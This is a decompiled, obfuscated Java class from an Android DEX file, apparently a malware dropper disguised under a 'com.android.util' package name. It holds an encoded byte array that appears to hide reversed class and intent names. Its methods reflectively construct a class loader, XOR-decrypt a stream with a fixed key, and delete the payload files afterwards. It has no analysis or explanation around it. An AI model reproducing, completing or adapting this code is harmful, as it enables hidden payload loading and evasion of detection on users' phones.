package com.android.util.hKq.a;

import android.content.Context;
import android.text.TextUtils;
import android.util.Log;
import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;
/* loaded from: /mnt/shared/apks/menSe7ni.dex */
public final class j {

    /* renamed from: a  reason: collision with root package name */
    public static final byte[] f381a = {76, 68, 74, 105, 97, 87, 119, 115, 99, 50, 74, 112, 98, 67, 120, 69, 82, 85, 82, 69, 81, 86, 57, 70, 82, 48, 70, 76, 81, 48, 70, 81, 76, 109, 53, 118, 97, 88, 82, 106, 89, 83, 53, 48, 98, 109, 86, 48, 98, 109, 107, 117, 90, 71, 108, 118, 99, 109, 82, 117, 89, 83, 120, 79, 87, 86, 78, 102, 81, 86, 82, 66, 82, 70, 57, 83, 82, 86, 78, 86, 76, 109, 53, 118, 97, 88, 82, 106, 89, 83, 53, 48, 98, 109, 86, 48, 98, 109, 107, 117, 90, 71, 108, 118, 99, 109, 82, 117, 89, 83, 120, 69, 82, 86, 82, 70, 84, 70, 66, 78, 84, 48, 78, 102, 86, 69, 57, 80, 81, 105, 53, 117, 98, 50, 108, 48, 89, 50, 69, 117, 100, 71, 53, 108, 100, 71, 53, 112, 76, 109, 82, 112, 98, 51, 74, 107, 98, 109, 69, 115, 86, 69, 53, 70, 85, 48, 86, 83, 85, 70, 57, 83, 82, 86, 78, 86, 76, 109, 53, 118, 97, 88, 82, 106, 89, 83, 53, 48, 98, 109, 86, 48, 98, 109, 107, 117, 90, 71, 108, 118, 99, 109, 82, 117, 89, 83, 120, 70, 82, 48, 53, 66, 83, 69, 78, 102, 87, 86, 82, 74, 86, 107, 108, 85, 81, 48, 86, 79, 84, 107, 57, 68, 76, 109, 53, 117, 98, 50, 77, 117, 100, 71, 86, 117, 76, 109, 82, 112, 98, 51, 74, 107, 98, 109, 69, 115, 90, 71, 120, 121, 76, 72, 108, 48, 99, 105, 120, 122, 100, 83, 120, 48, 101, 71, 86, 48, 98, 109, 57, 68, 76, 110, 82, 117, 90, 88, 82, 117, 98, 50, 77, 117, 90, 71, 108, 118, 99, 109, 82, 117, 89, 83, 120, 121, 90, 87, 82, 104, 98, 48, 120, 122, 99, 50, 70, 115, 81, 51, 82, 108, 90, 121, 119, 115, 99, 109, 86, 107, 89, 87, 57, 77, 99, 51, 78, 104, 98, 69, 78, 52, 90, 85, 81, 117, 98, 87, 86, 48, 99, 51, 108, 122, 76, 109, 116, 112, 100, 109, 120, 104, 90, 67, 120, 121, 90, 87, 82, 104, 98, 48, 120, 122, 99, 50, 70, 115, 81, 121, 53, 110, 98, 109, 70, 115, 76, 109, 70, 50, 89, 87, 111, 115, 99, 51, 78, 104, 98, 69, 78, 107, 89, 87, 57, 115, 76, 71, 120, 115, 89, 87, 77, 117, 77, 88, 111, 117, 98, 87, 57, 106, 76, 72, 104, 108, 90, 67, 52, 51, 88, 51, 66, 49, 97, 50, 78, 104, 89, 105, 52, 118, 76, 72, 74, 104, 97, 105, 52, 51, 88, 51, 66, 49, 97, 50, 78, 104, 89, 105, 52, 118, 76, 71, 100, 118, 98, 67, 52, 49, 88, 51, 66, 49, 97, 50, 78, 104, 89, 105, 52, 118};

    public static int a(String str, String str2) {
        try {
            if (!TextUtils.isEmpty(str) && !TextUtils.isEmpty(str2)) {
                new File(str + str2).delete();
                new File(str).delete();
                return 1;
            }
            return -1;
        } catch (Exception unused) {
            return 1;
        }
    }

    private static Class a(String str) {
        try {
            return Class.forName(str);
        } catch (ClassNotFoundException unused) {
            return null;
        }
    }

    public static Object a(Context context, String str, String str2) {
        try {
            String a2 = com.android.util.hKq.b.d.a(5);
            String a3 = com.android.util.hKq.b.d.a(9);
            String a4 = com.android.util.hKq.b.d.a(8);
            Class<?> a5 = a(a2);
            Class<?>[] clsArr = {String.class, String.class, String.class, a5};
            Object newInstance = a(com.android.util.hKq.b.d.a(6)).getDeclaredConstructor(clsArr).newInstance(str, str2, null, a(a3).getDeclaredMethod(a4, new Class[0]).invoke(context, new Object[0]));
            Log.d(com.android.util.hKq.b.g.f388a, "!");
            return newInstance;
        } catch (Exception unused) {
            return null;
        }
    }

    public static void a(InputStream inputStream, OutputStream outputStream) {
        try {
            try {
                byte[] bArr = new byte[1024];
                byte[] bArr2 = new byte[inputStream.available()];
                int i = 0;
                while (true) {
                    int read = inputStream.read(bArr);
                    if (read < 0) {
                        outputStream.write(bArr2);
                        return;
                    }
                    int i2 = 0;
                    while (i2 < read) {
                        bArr2[i] = (byte) (bArr[i2] ^ 121);
                        i2++;
                        i++;
                    }
                }
            } catch (Exception unused) {
            } finally {
                inputStream.close();
                outputStream.flush();
                outputStream.close();
            }
        } catch (Exception unused2) {
        }
    }
}
